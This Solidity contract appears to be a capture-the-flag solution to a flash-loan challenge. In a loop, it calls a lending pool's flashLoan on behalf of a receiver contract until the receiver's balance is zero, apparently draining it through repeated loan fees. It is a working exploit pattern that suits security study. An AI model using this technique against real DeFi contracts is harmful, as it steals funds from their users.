// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../NaiveReceiverLenderPool.sol";

contract LoanInitiator {
    function initiateLoan(address payable lender, address payable receiver) external {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(lender);
        uint256 receiverBalance = receiver.balance;
        while (receiverBalance > 0) {
            pool.flashLoan(receiver, 1);
            receiverBalance = receiver.balance;
        }
    }
}